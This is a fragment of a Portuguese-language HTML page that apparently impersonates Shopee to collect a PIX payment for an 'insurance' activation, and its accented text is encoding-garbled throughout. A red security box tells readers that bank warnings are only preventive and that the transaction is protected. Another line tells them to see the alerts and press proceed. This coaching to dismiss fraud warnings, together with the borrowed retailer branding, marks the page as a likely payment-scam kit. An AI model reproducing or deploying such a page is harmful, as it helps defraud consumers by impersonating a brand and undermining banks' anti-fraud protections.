                Para realizar o pagamento:
              </p>

              <div
                class="bg-white p-4 rounded-xl shadow-sm mb-4 border-l-4 border-shopee"
              >
                <p class="font-medium text-gray-700 flex items-center">
                  <span
                    class="flex items-center justify-center bg-shopee text-white rounded-full w-8 h-8 min-w-[2rem] mr-3 font-bold"
                    >1</span
                  >
                  Abra o aplicativo do seu banco
                </p>
              </div>

              <div
                class="bg-white p-4 rounded-xl shadow-sm mb-4 border-l-4 border-shopee"
              >
                <p class="font-medium text-gray-700 flex items-center">
                  <span
                    class="flex items-center justify-center bg-shopee text-white rounded-full w-8 h-8 min-w-[2rem] mr-3 font-bold"
                    >2</span
                  >
                  Escolha a op√ß√£o PAGAR COM PIX, cole o c√≥digo onde est√° a op√ß√£o
                  copiar e colar, ou use a c√¢mera para pagar com QR Code
                </p>
              </div>

              <div
                class="bg-white p-4 rounded-xl shadow-sm mb-4 border-l-4 border-shopee"
              >
                <p class="font-medium text-gray-700 flex items-center">
                  <span
                    class="flex items-center justify-center bg-shopee text-white rounded-full w-8 h-8 min-w-[2rem] mr-3 font-bold"
                    >3</span
                  >
                  Confirme as informa√ß√µes e finalize
                </p>
              </div>
            </div>
          </div>

          <!-- Alerta de seguran√ßa -->
          <div
            class="mt-6 bg-red-50 border-2 border-red-400 rounded-xl p-5 shadow-md"
          >
            <div class="flex items-start">
              <div
                class="mr-4 bg-red-100 p-2 rounded-full flex items-center justify-center w-10 h-10 min-w-[2.5rem]"
              >
                <i class="fas fa-exclamation-triangle text-red-500 text-lg"></i>
              </div>
              <div>
                <p class="text-red-800 font-medium mb-1">Aviso de Seguran√ßa</p>
                <p class="text-sm text-gray-700">
                  Os bancos refor√ßaram a seguran√ßa do PIX e podem exibir avisos
                  preventivos. N√£o se preocupe, sua transa√ß√£o est√° protegida.
                </p>
              </div>
            </div>
          </div>

          <!-- Bancos e bot√£o de prosseguir -->
          <div class="mt-6">
            <p class="text-center mb-4 text-shopee font-medium">
              Veja alguns alertas e aperte em prosseguir
            </p>

            <div
              class="bg-white p-5 rounded-xl shadow-md border border-gray-200"
            >
              <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div class="flex justify-center">
                  <img
                    src="images/nubank-logo-3.png"
                    alt="Nubank"
                    class="h-10 object-contain"
                  />
                </div>
                <div class="flex justify-center">
                  <img
                    src="images/logo-itau-2048.png"
                    alt="Ita√∫"
                    class="h-10 object-contain"
                  />
                </div>
                <div class="flex justify-center">
                  <img
                    src="images/bradesco-logo-novo-2018.png"
                    alt="Bradesco"
                    class="h-10 object-contain"
                  />
                </div>
                <div class="flex justify-center">
                  <img
                    src="images/png-clipart-santander-bank-santander-group-santander-securities-llc-bank-text-logo-thumbnail.png"
                    alt="Santander"
                    class="h-10 object-contain"
                  />
                </div>
              </div>

              <button
                class="w-full mt-5 bg-shopee hover:bg-shopee-dark text-white font-bold py-3 rounded-lg transition-colors duration-300 focus:outline-none focus:ring-2 focus:ring-shopee focus:ring-opacity-50 shadow-md"
              >
                Prosseguir
              </button>
            </div>
          </div>
        </div>

        <!-- Seguran√ßa -->
        <div class="mt-6 text-center">
          <div class="inline-flex items-center text-sm text-shopee-gray">
            <i class="fas fa-lock mr-2"></i>
            <span>Shopee - Pagamento 100% seguro via PIX</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Notifica√ß√£o de c√≥pia -->
    <div
      id="notification"
      class="fixed top-4 right-4 bg-shopee text-white px-4 py-2 rounded-lg shadow-lg opacity-0 -translate-y-4 transition-all duration-300"
    >
      <div class="flex items-center">
        <i class="fas fa-check-circle mr-2"></i>
        <span>C√≥digo PIX copiado! Finalize para ativar seu seguro.</span>
      </div>
    </div>

    <!-- Loading overlay -->
    <div id="loading" class="loading-overlay hidden">
      <div class="spinner"></div>
    </div>

    <!-- Bot√£o flutuante de WhatsApp -->
    <a
      href="https://wa.me/5511999999999"
      target="_blank"
      class="fixed bottom-6 right-6 bg-green-500 text-white rounded-full p-4 shadow-lg hover:bg-green-600 transition-colors duration-200 z-50"
      title="Falar com suporte"
    >
      <svg
        xmlns="http://www.w3.org/2000/svg"
        class="h-6 w-6"
        fill="currentColor"
        viewBox="0 0 24 24"
      >
        <path
          d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"
        ></path>
      </svg>
    </a>
  </body>
</html>
